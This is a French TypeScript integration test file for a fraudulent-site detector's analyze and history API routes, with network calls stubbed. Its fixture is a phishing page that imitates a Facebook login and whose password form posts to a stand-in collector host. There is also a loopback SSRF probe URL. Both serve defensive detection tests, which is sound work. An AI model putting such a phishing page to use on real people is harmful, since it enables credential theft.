/**
 * Tests d'INTEGRATION du module de detection de sites frauduleux :
 * POST /api/sites/analyze et GET /api/cases/[caseId]/sites appeles directement
 * (sans serveur) contre la base de test dediee.
 *
 * Le reseau est entierement simule : DNS (node:dns/promises) et fetch globaux
 * sont stubbes — aucun appel sortant reel.
 */
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";

import { prisma } from "@/lib/prisma";
import { POST as analyzePOST } from "@/app/api/sites/analyze/route";
import { GET as historyGET } from "@/app/api/cases/[caseId]/sites/route";

// --- Simulation du reseau --------------------------------------------------

const PAGE_PHISHING = `<!doctype html>
<html>
  <head><title>Facebook Login - Securite du compte</title></head>
  <body>
    <h1>Facebook Login</h1>
    <p>Verifiez votre compte, votre compte sera suspendu.</p>
    <form action="https://collecteur-evil.xyz/submit" method="post">
      <input type="password" name="pass" />
    </form>
  </body>
</html>`;

vi.mock("node:dns/promises", () => ({
  default: {
    lookup: vi.fn(async () => [{ address: "93.184.216.34", family: 4 }]),
  },
}));

const fetchMock = vi.fn(
  async () => new Response(PAGE_PHISHING, { status: 200, headers: { "Content-Type": "text/html" } }),
);

// --- Fixtures --------------------------------------------------------------

let analysteId = "";
let lecteurId = "";
let caseId = "";

function ctx<T>(params: T) {
  return { params: Promise.resolve(params) };
}

function requeteAnalyse(corps: unknown, userId?: string): Request {
  return new Request("http://test.local/api/sites/analyze", {
    method: "POST",
    body: JSON.stringify(corps),
    headers: {
      "Content-Type": "application/json",
      ...(userId ? { "x-user-id": userId } : {}),
    },
  });
}

beforeAll(async () => {
  vi.stubGlobal("fetch", fetchMock);

  const analyste = await prisma.user.upsert({
    where: { email: "dev@cybertrace.bf" },
    update: {},
    create: { email: "dev@cybertrace.bf", nom: "Analyste Test", role: "ANALYSTE" },
  });
  analysteId = analyste.id;

  const lecteur = await prisma.user.upsert({
    where: { email: "lecteur@cybertrace.bf" },
    update: {},
    create: { email: "lecteur@cybertrace.bf", nom: "Lecteur Test", role: "LECTEUR" },
  });
  lecteurId = lecteur.id;

  const dossier = await prisma.case.upsert({
    where: { reference: "CT-TEST-SITES" },
    update: {},
    create: {
      reference: "CT-TEST-SITES",
      titre: "Dossier detection de sites",
      categorie: "Hameconnage",
      creeParId: analysteId,
    },
  });
  caseId = dossier.id;
});

afterAll(async () => {
  vi.unstubAllGlobals();
  await prisma.auditLog.deleteMany({});
  await prisma.siteCheck.deleteMany({});
  await prisma.case.deleteMany({});
  await prisma.user.deleteMany({});
});

describe("POST /api/sites/analyze", () => {
  it("analyse complete (URL + contenu) -> FRAUDULEUSE rattachee au dossier", async () => {
    const res = await analyzePOST(
      requeteAnalyse({ url: "https://facebook-secure-login.xyz/verify", caseId }),
    );
    expect(res.status).toBe(201);
    const corps = await res.json();
    const analyse = corps.analyse;

    expect(analyse.verdict).toBe("FRAUDULEUSE");
    expect(analyse.score).toBeGreaterThanOrEqual(60);
    expect(analyse.contenuAnalyse).toBe(true);

    const codes = analyse.indicateurs.map((i: { code: string }) => i.code);
    expect(codes).toContain("MARQUE_USURPEE"); // heuristique d'URL
    expect(codes).toContain("TLD_SUSPECT");
    expect(codes).toContain("CHAMP_MOT_DE_PASSE"); // analyse de contenu
    expect(codes).toContain("FORMULAIRE_EXTERNE");

    // Persistance rattachee au dossier et a l'acteur.
    const enBase = await prisma.siteCheck.findUnique({ where: { id: analyse.id } });
    expect(enBase).not.toBeNull();
    expect(enBase!.caseId).toBe(caseId);
    expect(enBase!.effectueParId).toBe(analysteId);
    expect(enBase!.verdict).toBe("FRAUDULEUSE");

    // Traçabilité : entree d'audit journalisee.
    const trace = await prisma.auditLog.findFirst({
      where: { action: "ANALYZE_SITE", ressource: `sitecheck:${analyse.id}` },
    });
    expect(trace).not.toBeNull();
    expect(trace!.resultat).toBe("SUCCES");
  });

  it("protection SSRF : boucle locale bloquee, aucun telechargement", async () => {
    fetchMock.mockClear();
    const res = await analyzePOST(
      requeteAnalyse({ url: "http://127.0.0.1:80/login/verify", caseId }, analysteId),
    );
    expect(res.status).toBe(201);
    const corps = await res.json();

    expect(corps.analyse.contenuAnalyse).toBe(false);
    const codes = corps.analyse.indicateurs.map((i: { code: string }) => i.code);
    expect(codes).toContain("SSRF_BLOQUE");
    expect(codes).toContain("IP_EN_LIEU_DE_DOMAINE");
    // Verdict fonde sur l'URL seule (IP + http + chemin d'hameconnage).
    expect(corps.analyse.verdict).not.toBe("SURE");
    // Le stub fetch n'a JAMAIS ete appele : rien n'a ete telecharge.
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("lecture interdite a un role LECTEUR (403)", async () => {
    const res = await analyzePOST(
      requeteAnalyse({ url: "https://exemple.com/", caseId }, lecteurId),
    );
    expect(res.status).toBe(403);
    const corps = await res.json();
    expect(corps.code).toBe("FORBIDDEN");
  });

  it("URL absente -> 400", async () => {
    const res = await analyzePOST(requeteAnalyse({ caseId }, analysteId));
    expect(res.status).toBe(400);
    const corps = await res.json();
    expect(corps.code).toBe("NO_URL");
  });

  it("dossier inexistant -> 404", async () => {
    const res = await analyzePOST(
      requeteAnalyse({ url: "https://exemple.com/", caseId: "id-inexistant" }, analysteId),
    );
    expect(res.status).toBe(404);
    const corps = await res.json();
    expect(corps.code).toBe("CASE_NOT_FOUND");
  });
});

describe("GET /api/cases/[caseId]/sites", () => {
  it("retourne l'historique des analyses du dossier, du plus recent au plus ancien", async () => {
    const res = await historyGET(
      new Request("http://test.local/api/sites", { headers: { "x-user-id": analysteId } }),
      ctx({ caseId }),
    );
    expect(res.status).toBe(200);
    const corps = await res.json();

    expect(corps.analyses.length).toBeGreaterThanOrEqual(1);
    const fraude = corps.analyses.find(
      (a: { hote: string }) => a.hote === "facebook-secure-login.xyz",
    );
    expect(fraude).toBeDefined();
    expect(fraude.verdict).toBe("FRAUDULEUSE");
    expect(Array.isArray(fraude.indicateurs)).toBe(true);
    expect(fraude.effectuePar.nom).toBe("Analyste Test");
    // L'analyse la plus recente est en tete de liste.
    const horodatages = corps.analyses.map((a: { analyseLe: string }) => Date.parse(a.analyseLe));
    expect([...horodatages].sort((a, b) => b - a)).toEqual(horodatages);
  });

  it("dossier inexistant -> 404", async () => {
    const res = await historyGET(
      new Request("http://test.local/api/sites", { headers: { "x-user-id": analysteId } }),
      ctx({ caseId: "id-inexistant" }),
    );
    expect(res.status).toBe(404);
  });
});
